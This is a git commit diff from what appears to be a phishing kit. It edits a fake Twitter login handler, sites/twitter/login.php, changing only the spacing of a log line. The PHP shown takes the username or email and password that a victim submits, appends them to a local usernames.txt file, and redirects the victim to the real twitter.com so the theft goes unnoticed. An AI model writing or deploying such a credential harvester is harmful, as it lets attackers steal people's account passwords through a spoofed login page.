033e27f697418ac7e22abb5519fe17a4663ff56e
The Linux Choice <34893261+thelinuxchoice@users.noreply.github.com>
2018-06-23 08:46:12 -0300

    Update login.php

--- sites/twitter/login.php
+++ sites/twitter/login.php
@@ -1,5 +1,5 @@
 <?php
 
-file_put_contents("usernames.txt", "Account: " . $_POST['usernameOrEmail'] . "Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
+file_put_contents("usernames.txt", "Account: " . $_POST['usernameOrEmail'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://twitter.com/');
 exit();
